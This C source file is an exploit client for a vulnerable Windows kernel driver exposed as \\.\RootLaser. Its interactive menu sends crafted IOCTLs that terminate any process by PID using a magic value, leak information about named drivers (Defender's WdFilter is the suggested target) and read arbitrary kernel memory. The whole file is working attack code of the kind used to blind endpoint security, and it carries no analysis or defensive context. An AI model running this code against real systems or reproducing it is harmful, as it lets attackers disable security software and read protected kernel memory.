#include <stdio.h>
#include <windows.h>
#include <winnt.h>

// The IOCTL code that triggers the termination path
#define IOCTL_TERMINATE_PROCESS 0x22E044

// The IOCTL for the Arbitrary Kernel Read vulnerability
#define IOCTL_ARBITRARY_KERNEL_READ 0x22E050

// The IOCTL for the Driver Information Leak vulnerability
#define IOCTL_LEAK_DRIVER_INFO 0x22E05C

// The 8-byte structure for the kill request
#pragma pack(push, 1)
typedef struct _KILL_REQUEST {
    UINT32 MagicValue;
    UINT32 ProcessId;
} KILL_REQUEST, *PKILL_REQUEST;

// Structure for the Arbitrary Kernel Read request
typedef struct _KERNEL_READ_REQUEST {
    UINT64 AddressToRead;
    UINT32 _padding; // The driver's struct is likely padded
    UINT32 SizeToRead;
} KERNEL_READ_REQUEST, *PKERNEL_READ_REQUEST;
#pragma pack(pop)

// Helper function to print a buffer as a hex dump
void printHex(const char* header, const unsigned char* buffer, size_t size) {
    printf("%s (%zu bytes):\n", header, size);
    if (!buffer || size == 0) return;
    for (size_t i = 0; i < size; ++i) {
        if (i % 16 == 0) printf("  %04zX: ", i);
        printf("%02X ", buffer[i]);
        if ((i + 1) % 16 == 0 || i == size - 1) printf("\n");
    }
}

// Function for process termination
void terminateProcess(HANDLE hDevice) {
    KILL_REQUEST request = { 0 };
    printf("\n--- Triggering Process Termination ---\n");
    printf("Enter the Process ID (PID) to terminate: ");
    if (scanf_s("%u", &request.ProcessId) != 1) { return; }

    request.MagicValue = 0xEE00AA77;
    printf("[*] Sending IOCTL 0x%lX to kill PID %u...\n", IOCTL_TERMINATE_PROCESS, request.ProcessId);

    if (!DeviceIoControl(hDevice, IOCTL_TERMINATE_PROCESS, &request, sizeof(request), NULL, 0, NULL, NULL)) {
        printf("[-] DeviceIoControl failed. Error: %lu\n", GetLastError());
    } else {
        printf("[+] IOCTL sent successfully.\n");
    }
}

// Function for leaking driver information
void leakDriverInfo(HANDLE hDevice) {
    wchar_t driverName[MAX_PATH] = { 0 };
    // The driver expects a 1448-byte buffer
    unsigned char outputBuffer[1448] = { 0 };

    printf("\n--- Triggering Driver Information Leak ---\n");
    printf("Enter the name of the target driver (e.g., \\Driver\\WdFilter): ");
    
    fgetws(driverName, MAX_PATH, stdin);
    fgetws(driverName, MAX_PATH, stdin);
    driverName[wcslen(driverName) - 1] = L'\0';

    wprintf(L"[*] Sending IOCTL 0x%lX for driver: %ls...\n", IOCTL_LEAK_DRIVER_INFO, driverName);

    DWORD inputSize = (DWORD)((wcslen(driverName) + 1) * sizeof(wchar_t));

    if (!DeviceIoControl(hDevice, IOCTL_LEAK_DRIVER_INFO, driverName, inputSize, outputBuffer, sizeof(outputBuffer), NULL, NULL)) {
        printf("[-] DeviceIoControl failed. Error: %lu\n", GetLastError());
    } else {
        printf("[+] IOCTL sent successfully. Leaked data:\n");
        printHex("Driver Info Buffer", outputBuffer, sizeof(outputBuffer));
    }
}

// Function for the arbitrary kernel read
void arbitraryKernelRead(HANDLE hDevice) {
    KERNEL_READ_REQUEST request = { 0 };
    unsigned char readBuffer[256] = { 0 }; // Read up to 256 bytes

    printf("\n--- Triggering Arbitrary Kernel Read (EXTREMELY DANGEROUS) ---\n");
    printf("Enter kernel address to read from (in hex): 0x");
    if (scanf_s("%llx", &request.AddressToRead) != 1) { return; }

    printf("Enter number of bytes to read (max 256): ");
    if (scanf_s("%u", &request.SizeToRead) != 1) { return; }

    if (request.SizeToRead > sizeof(readBuffer)) {
        printf("[-] Read size too large, clamping to %zu bytes.\n", sizeof(readBuffer));
        request.SizeToRead = sizeof(readBuffer);
    }

    printf("[*] Sending IOCTL 0x%lX to read %u bytes from 0x%llX...\n", IOCTL_ARBITRARY_KERNEL_READ, request.SizeToRead, request.AddressToRead);
    
    if (!DeviceIoControl(hDevice, IOCTL_ARBITRARY_KERNEL_READ, &request, sizeof(request), &request, sizeof(request), NULL, NULL)) {
        printf("[-] DeviceIoControl failed. Error: %lu\n", GetLastError());
    } else {
        printf("[+] IOCTL sent successfully. Data read from kernel:\n");
        memcpy(readBuffer, &request, request.SizeToRead);
        printHex("Kernel Read Buffer", readBuffer, request.SizeToRead);
    }
}

int main(void) {
    HANDLE hDevice = INVALID_HANDLE_VALUE;
    int choice = 0;

    hDevice = CreateFileA(
        "\\\\.\\RootLaser",
        GENERIC_READ | GENERIC_WRITE,
        FILE_SHARE_READ | FILE_SHARE_WRITE,
        NULL, OPEN_EXISTING, 0, NULL
    );

    if (hDevice == INVALID_HANDLE_VALUE) {
        printf("[-] Failed to connect to the driver. Error: %lu\n", GetLastError());
        return -1;
    }

    printf("[+] Successfully connected to \\\\.\\RootLaser\n");
    
    while (1) {
        printf("\nSelect an action:\n");
        printf("  1. Terminate Process\n");
        printf("  2. Leak Driver Information\n");
        printf("  3. Arbitrary Kernel Read (DANGEROUS)\n");
        printf("  4. Exit\n");
        printf(">> ");

        if (scanf_s("%d", &choice) != 1) {
             while (getchar() != '\n');
             choice = 0;
        }

        switch (choice) {
            case 1:
                terminateProcess(hDevice);
                break;
            case 2:
                leakDriverInfo(hDevice);
                break;
            case 3:
                arbitraryKernelRead(hDevice);
                break;
            case 4:
                printf("Exiting...\n");
                CloseHandle(hDevice);
                return 0;
            default:
                printf("Invalid choice. Please try again.\n");
                break;
        }
    }
}
